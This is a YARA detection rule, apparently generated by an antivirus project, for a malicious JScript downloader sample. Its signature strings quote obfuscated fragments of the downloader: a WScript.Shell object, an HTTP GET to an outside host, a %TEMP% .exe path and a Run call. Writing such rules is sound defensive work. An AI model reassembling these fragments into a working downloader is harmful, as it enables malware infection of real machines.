rule sig_20160330_6a04144601e4050265ac88948a7809a6 {
  meta:
    description = "datamaliciousorder - file 20160330_6a04144601e4050265ac88948a7809a6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "addb2ca9c26454b4b6792c4b96eb381438b64c03c7528964d315fa0daaa78db8"

  strings:
    $s1  = "var _W0 = function _KW() {return WScript[_IU](\"WScript\"+\".Shell\");}(), _P0 = 11;" fullword ascii
    $s2  = "_JZ[_JG](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s3  = "function _U(_Z0, _E){_DV = _DV * 1; return _Z0 - _E;};" fullword ascii
    $s4  = "if (_JZ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P() {return _W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SMWqDZws4y3JrD.ex\" + \"e\";};" fullword ascii
    $s6  = "function _FZ(){return _D0 + \"\";};" fullword ascii
    $s7  = "function _M() {return ((_ZC == true) && (_ZC == _G0)) ? 1 : _DV;};" fullword ascii
    $s8  = "function _ZO(_S0){_W0[\"Run\"](_S0, _DV, _DV);};" fullword ascii
    $s9  = "function _W(){return 22;};" fullword ascii
    $s10 = "function _F()" fullword ascii
    $s11 = "function _SF(){return _IU;};" fullword ascii
    $s12 = "return _U(_Y, _L);" fullword ascii
    $s13 = "function _J(_S) {var _F0 = (1, 2, 3, 4, 5, _S); return _F0;};" fullword ascii
    $s14 = "var _N = new this[\"Date\"]();" fullword ascii
    $s15 = " while (_G){" fullword ascii
    $s16 = "var _G0 = false;" fullword ascii
    $s17 = "_ZC = true; " fullword ascii
    $s18 = "var _ZC = false;" fullword ascii
    $s19 = "var _IS = false;" fullword ascii
    $s20 = "_G0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}